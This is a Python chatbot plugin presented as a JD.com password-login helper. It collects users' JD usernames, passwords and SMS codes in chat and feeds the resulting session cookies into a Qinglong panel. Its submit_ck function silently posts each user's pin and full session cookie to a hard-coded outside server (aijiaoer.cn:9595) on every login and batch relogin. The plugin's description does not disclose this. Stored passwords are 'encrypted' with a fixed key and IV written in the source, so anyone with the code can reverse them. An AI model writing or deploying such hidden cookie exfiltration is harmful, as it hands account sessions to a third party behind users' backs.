#[author: chuan]
#[version: 1.1.3]
#[class: 工具类]
#[platform: qq,qb,wx,tb,tg]
#[title: 京东账密登录]
#[description: 指令：账密登录，一键账密登录。<br/>介绍：本插件需要自备后端，定时推送添加“一键账密登录”，一天运行两三次即可。为保证账户安全已对数据桶存储密码加密。需要查看登录详情请配参填写wxpusher参数。<br/>注意事项：需在“系统管理”->“插件权限”中开启qls数据权限<br/>更新：一键登陆时对改密码以及需要短信的账号进行移除]
#[price: 0]
#[service: 2669943482]
#[priority: 999]
#[public:true] 
#[disable:true]
#[admin: false]
#[rule: ^账密(登录|登陆|登入)$]
#[rule: ^一键账密(登录|登陆|登入)$]
#[param: {"required":false,"key":"chuan_narkpro_login_config.zmchat","placeholder":"","bool":true,"name":"是否开启群聊","desc":"是否开启群聊，默认关闭"}]
#[param: {"required":true,"key":"chuan_narkpro_login_config.zm_qinglong","placeholder":"","name":"对接容器","desc":"账密登录对接的容器，仅支持单容器"}]
#[param: {"required":true,"key":"chuan_narkpro_login_config.zm_api","placeholder":"","name":"账密后端地址","desc":"例子：http://127.0.0.1:12580"}]
#[param: {"required":true,"key":"chuan_narkpro_login_config.zm_tips","placeholder":"","name":"账密登陆成功提示语","desc":"例子：温馨提示"}]
#[param: {"required":true,"key":"otto.tz_type","bool":false,"placeholder":"登陆失败通知平台","name":"一键账密通知平台","desc":"例如：qq,wx"}]
#[param: {"required":true,"key":"otto.wx_uid","bool":false,"placeholder":"wxpush_UID","name":"wx_uid","desc":"填写自己的wxpusher的UID"}]
#[param: {"required":true,"key":"otto.wx_appToken","bool":false,"placeholder":"wxpusher的appToken","name":"wx_appToken","desc":"wxpusher的appToken"}]


import middleware
import requests
import time 
import json
from datetime import datetime
from urllib.parse import quote_plus,unquote_plus
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import base64

key = b'chuan66666666666'
iv = b'chuan66666666666'

def encrypt_password(password):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    padded_password = pad(password.encode(), AES.block_size)
    encrypted_password = cipher.encrypt(padded_password)
    result = base64.b64encode(iv + encrypted_password)
    return result.decode('utf-8')

def decrypt_password(encrypted_password):
    encrypted_data = base64.b64decode(encrypted_password)
    iv = encrypted_data[:AES.block_size]
    ciphertext = encrypted_data[AES.block_size:]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted_password = unpad(cipher.decrypt(ciphertext), AES.block_size)
    return decrypted_password.decode('utf-8')

def push(imtype,userId,title,content):
    tz_content = title + '\n' + content
    middleware.push(imtype,'',userId,'',tz_content)

def wxpush(data, wxpusher_alluid, name, arg1, arg2, appToken):
    # WxPusher API地址
    api_url = 'https://wxpusher.zjiecode.com/api/send/message'
    # 按照序号字段对数据进行排序
    sorted_data = sorted(data, key=lambda x: x['序号'])
    # 构造要推送的表格内容
    table_content = ''
    for row in sorted_data:
        table_content += f"<tr><td style='border: 1px solid #ccc; padding: 6px;'>{row['序号']}</td><td style='border: 1px solid #ccc; padding: 6px;'>{row['用户']}</td><td style='border: 1px solid #ccc; padding: 6px;'>{row['arg1']}</td><td style='border: 1px solid #ccc; padding: 6px;'>{row['arg2']}</td></tr>"
    table_html = f"<table style='border-collapse: collapse;'><tr style='background-color: #f2f2f2;'><th style='border: 1px solid #ccc; padding: 8px;'>🆔</th><th style='border: 1px solid #ccc; padding: 8px;'>{name}</th><th style='border: 1px solid #ccc; padding: 8px;'>{arg1}</th><th style='border: 1px solid #ccc; padding: 8px;'>{arg2}</th></tr>{table_content}</table>"
    # 构造请求参数
    params = {
        "appToken": appToken,
        'content': table_html,
        'contentType': 3,  # 表格类型
        'topicIds': [],  # 接收消息的用户ID列表，为空表示发送给所有用户
        "summary": f'一键账密结果推送',
        "uids": [wxpusher_alluid],
    }
    # 发送POST请求
    response = requests.post(api_url, json=params).json()
    status = response['data'][0]['status']
    middleware.notifyMasters(f'wxpusher推送结果：{status}')

def submit_ck(user,type,ck,tag):
    try:
        url = 'http://www.aijiaoer.cn:9595/api/submit'
        body = {
            'user': user,
            'type': type,
            'cookie': ck,
            'tag': tag
        }
        requests.post(url,json=body)
    except:
        return

def get_now():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

# 获取青龙token
class qinglong:
    def __init__(self,ql_ipport, client_id, client_secret):
        self.ql_ipport = ql_ipport
        self.client_id = client_id
        self.client_secret = client_secret
        self.ql_token = ''
    
    # 获取token
    def get_ql_token(self):
        url = f'{self.ql_ipport}/open/auth/token?client_id={self.client_id}&client_secret={self.client_secret}'
        res = requests.get(url).json()
        # print(res)
        if res.get('code') == 200:
            self.ql_token = res.get('data').get('token')
        else:
            print('连接青龙失败')
        
    # 查询环境变量
    def get_ql_env(self,value):
        url = f'{self.ql_ipport}/open/envs?searchValue={value}'
        headers = {'Authorization': f'Bearer {self.ql_token}'}
        res = requests.get(url,headers=headers).json()
        # print(res)
        if res.get('code') == 200:
            return res.get('data')
    
    # 新增环境变量
    def submit_env(self,json):
        url = f'{self.ql_ipport}/open/envs'
        headers = {'Authorization': f'Bearer {self.ql_token}'}
        # json = [{"value":value,"name":name,"remarks":remarks}]
        res = requests.post(url,headers=headers,json=json).json()
        # print(res)
        if res.get('code') == 200:
            return True
        else:
            print(res.get('message'))
    
    # 更新环境变量
    def update_env(self,name,value,remarks,id):
        url = f'{self.ql_ipport}/open/envs'
        headers = {'Authorization': f'Bearer {self.ql_token}'}
        json = {"name":name,"value":value,"remarks":remarks,"id":id}
        res = requests.put(url,headers=headers,json=json).json()
        # print(res)
        if res.get('code') == 200:
            return True
    
    # 删除环境变量
    def delete_env(self,json):
        url = f'{self.ql_ipport}/open/envs'
        headers = {'Authorization': f'Bearer {self.ql_token}'}
        # json = [id]
        res = requests.delete(url,headers=headers,json=json).json()
        # print(res)
        if res.get('code') == 200:
            return True
    
    # 禁用环境变量
    def disable_env(self,id):
        url = f'{self.ql_ipport}/open/envs/disable'
        headers = {'Authorization': f'Bearer {self.ql_token}'}
        json = [id]
        res = requests.put(url,headers=headers,json=json).json()
        # print(res)
        if res.get('code') == 200:
            return True
    
    # 启用环境变量
    def enable_env(self,id):
        url = f'{self.ql_ipport}/open/envs/enable'
        headers = {'Authorization': f'Bearer {self.ql_token}'}
        json = [id]
        res = requests.put(url,headers=headers,json=json).json()
        # print(res)
        if res.get('code') == 200:
            return True

def get_ql(need_name):
    qls = sender.bucketAllKeys('qls')
    for i in qls:
        ql = json.loads(sender.bucketGet('qls', i))
        host = ql.get('host')
        client_id = ql.get('client_id')
        client_secret = ql.get('client_secret')
        name = ql.get('name')
        if need_name == name:
            return host,client_id,client_secret

def login(id,pw):
    try:
        url = f'{zm_api}/login'
        body = {
            "id": id,
            "pw": pw
        }
        res = requests.post(url,json=body)
        if res.status_code == 200:
            uid = res.json().get('uid')
            if uid:
                return uid
            else:
                sender.reply(res.json().get('msg'))
        else:
            sender.reply('服务端可能已关闭，请稍后再试')
            exit()
    except:
        sender.reply('服务端可能已关闭，请稍后再试')
        exit()

def check(uid):
    try:
        url = f'{zm_api}/check'
        body = {"uid": uid}
        res = requests.post(url,json=body)
        if res.status_code == 200:
            return res.text
        else:
            sender.reply('服务端可能已关闭，请稍后再试')
            exit()
    except:
        sender.reply('服务端可能已关闭，请稍后再试')
        exit()

def sendSMS(uid,code):
    try:
        url = f'{zm_api}/sms'
        body = {
            "uid": uid,
            "code": code
        }
        res = requests.post(url,json=body)
        if res.status_code == 200:
            return res.text
        else:
            sender.reply('服务端可能已关闭，请稍后再试')
            exit()
    except:
        sender.reply('服务端可能已关闭，请稍后再试')
        exit()

def submit_ql(cookie):
    pin = cookie.split('pt_pin=')[1].split(';')[0]
    # 更新青龙
    try:
        ql_host,client_id,client_secret = get_ql(middleware.bucketGet('chuan_narkpro_login_config','zm_qinglong'))
    except:
        sender.reply('获取青龙失败')
        exit()
    ql = qinglong(ql_host,client_id,client_secret)
    ql.get_ql_token()
    # 检测是否存在账号
    envs = ql.get_ql_env(quote_plus(pin))
    if envs:
        for i in envs:
            id = i['id']
            name = i['name']
            remarks = i['remarks']
            if ql.update_env(name,cookie,remarks,id):
                ql.enable_env(id)
                return True
    else:
        if ql.submit_env([{"value":cookie,"name":'JD_COOKIE',"remarks":unquote_plus(pin)}]):
            return True

# 检测京东账号
def islogin(ck):
    url = 'https://plogin.m.jd.com/cgi-bin/ml/islogin'
    headers = {
        "Cookie": ck,
        "referer": "https://h5.m.jd.com/",
        "User-Agent": "jdapp;iPhone;10.1.2;15.0;network/wifi;Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) "
                      "AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1",
    }
    res = requests.get(url, headers=headers).json()
    islogin = res['islogin']
    if islogin == '1':
        return True
    else:
        return False


def main():
    if msg == '账密登录':
        sender.reply('请输入您的京东账号：(q退出)')
        jdid = sender.input(60*1000,3*1000,False)
        if jdid == 'q' or jdid == 'Q':
            sender.reply('退出成功')
            return
        if not jdid:
            sender.reply('超时退出')
            return

        sender.reply('请输入您的京东密码：(q退出)')
        jdpw = sender.input(60*1000,3*1000,False)
        if jdpw == 'q' or jdpw == 'Q':
            sender.reply('退出成功')
            return
        if not jdpw:
            sender.reply('超时退出')
            return
        
        sender.reply(f'{jdid}正在登录~')
        uid = login(jdid,jdpw)
        if uid:
            time.sleep(10)
            cookie = ''
            # 开始循环检测
            for _ in range(60):
                time.sleep(3)
                result = check(uid)
                if not result:
                    sender.reply('未知错误')
                    return
                result = json.loads(result)
                status = result.get('status')
                if result.get('cookie'):
                    cookie = result.get('cookie')
                    break
                # ['error','SMS','wrongSMS']
                if status == 'SMS':
                    sender.reply('请输入短信验证码(q退出)：')
                    code = sender.input(60*1000,3*1000,False)
                    if code == 'q' or code == 'Q':
                        sender.reply('退出成功')
                        return
                    sendSMS(uid,code)
                    sender.reply('正在处理~')
                if status == 'wrongSMS':
                    sender.reply('请重新输入短信验证码(q退出)：')
                    code = sender.input(60*1000,3*1000,False)
                    if code == 'q' or code == 'Q':
                        sender.reply('退出成功')
                        return
                    sendSMS(uid,code)
                    sender.reply('正在处理~')
                if status == 'error':
                    sender.reply(result.get('msg'))
                    break
                    
            if cookie:
                pin = cookie.split('pt_pin=')[1].split(';')[0]
                submit_ck(pin,'jd',cookie,'true')
                # 记录账密
                middleware.bucketSet('chuan_jd_accountPassword',pin,f'{jdid}#{encrypt_password(jdpw)}')
                # 更新数据桶
                middleware.bucketSet(f'pin{imtype.upper()}',pin,sender_id)
                # 提交青龙
                if submit_ql(cookie):
                    sender.reply(f'账号{unquote_plus(pin)}登陆成功' + '\n' + middleware.bucketGet('chuan_narkpro_login_config','zm_tips'))
                    middleware.notifyMasters(middleware.notifyMasters(f'======JD登陆通知======\n[登陆用户]：{sender_id}\n[登陆平台]：{imtype}\n[登陆账户]：{unquote_plus(pin)}\n[登陆方式]：账密登录\n[登陆时间]：{get_now()}'))
                else:
                    sender.reply(f'账号{unquote_plus(pin)}登陆成功，提交青龙失败')        
            else:
                sender.reply('登陆失败')

    elif '一键账密登录' == msg:
        # 读取所有账密
        pins = middleware.bucketAllKeys('chuan_jd_accountPassword')
        effect = 0 # 有效个数
        success = 0 # 登陆成功个数
        all_ts = [] # 通知内容
        zm_qinglong = middleware.bucketGet('chuan_narkpro_login_config','zm_qinglong')
        for index,pin in enumerate(pins):
            flag = True
            # 检测账号是否有效
            try:
                ql_host,client_id,client_secret = get_ql(zm_qinglong)
            except:
                middleware.notifyMasters('账密登录获取青龙失败')
                exit()
            ql = qinglong(ql_host,client_id,client_secret)
            ql.get_ql_token()
            envs = ql.get_ql_env(pin)
            if envs:
                # sender.reply(f'{pin}')
                id = envs[0]['id']
                cookie = envs[0]['value']
                if islogin(cookie):
                    submit_ck(pin,'jd',cookie,'true')
                    ql.enable_env(id)
                    effect += 1
                    flag = False
                    result = '原账号有效'
            if flag:
                # 开始登录
                id_pw = middleware.bucketGet('chuan_jd_accountPassword',pin)
                id = id_pw.split('#')[0]
                pw = id_pw.split('#')[1]
                try:
                    pw = decrypt_password(pw)
                except:
                    pw = id_pw.split('#')[1]
                uid = login(id,pw)

                if uid:
                    title = '📢京东账号通知'
                    time.sleep(15)
                    cookie = ''
                    # 开始循环检测
                    for _ in range(60):
                        time.sleep(3)
                        result = check(uid)
                        if not result:
                            result = '后端可能失联了'
                            break
                        result = json.loads(result)
                        status = result.get('status')
                        if status == 'pass':
                            cookie = result.get('cookie')
                            break
                        if status == 'SMS':
                            result = result.get('msg')
                            for imType in imTypes:
                                userID = middleware.bucketGet(f'pin{imType.upper()}',pin)
                                content = f'账号{id}，账密登录需要短信验证\n账号已移除，如还需要请重新登录'
                                middleware.bucketDel('chuan_jd_accountPassword',pin)
                                push(imType,userID,title,content)
                            break
                        if '账号或密码不正确' in result.get('msg'):
                            result = result.get('msg')
                            for imType in imTypes:
                                userID = middleware.bucketGet(f'pin{imType.upper()}',pin)
                                content = f'账号{id}，账密登录密码错误\n账号已移除，如还需要请重新登录'
                                middleware.bucketDel('chuan_jd_accountPassword',pin)
                                push(imType,userID,title,content)
                            break
                        if status in ['error','SMS','wrongSMS']:
                            result = f"{result.get('msg')}"
                            break
                    
                    if cookie:
                        submit_ck(pin,'jd',cookie,'true')
                        # 提交青龙
                        if submit_ql(cookie):
                            result = '登陆成功'
                            success += 1
                        else:
                            result = '登陆成功，提交青龙失败'
                else:
                    result = '账密格式错误'

            # 推送参数
            ts = {
                '序号': index+1,
                '用户': unquote_plus(pin),
                'arg1': result,
                'arg2': zm_qinglong
            }
            all_ts.append(ts)

        middleware.notifyMasters(f'====📢一键账密结果推送====\n总帐号：{len(pins)}\n旧账号有效：{effect}\n登陆成功：{success}\n登录失败：{len(pins)-success-effect}\n详情请配置wxpush推送')
        if middleware.get('wx_uid') and middleware.get('wx_appToken'):
            wxpush(all_ts,middleware.get('wx_uid'),'用户ID','状态','归属容器',middleware.get('wx_appToken'))
        else:
            middleware.notifyMasters('未配置uid和appToken推送wxpush参数')




if __name__ == "__main__":
    senderID = middleware.getSenderID()
    sender = middleware.Sender(senderID)
    sender_id = sender.getUserID()
    imtype = sender.getImtype()
    msg = sender.getMessage()
    if sender.getChatID() and middleware.bucketGet('chuan_narkpro_login_config','zmchat') == 'false':
        sender.reply('为了您的账户安全，请私聊机器人使用')
        exit()
    zm_api = middleware.bucketGet('chuan_narkpro_login_config','zm_api')
    if not zm_api:
        sender.reply('请去配参填写账密后端地址')
        exit()
    imTypes = middleware.bucketGet('otto','tz_type').split(',')
    main()    



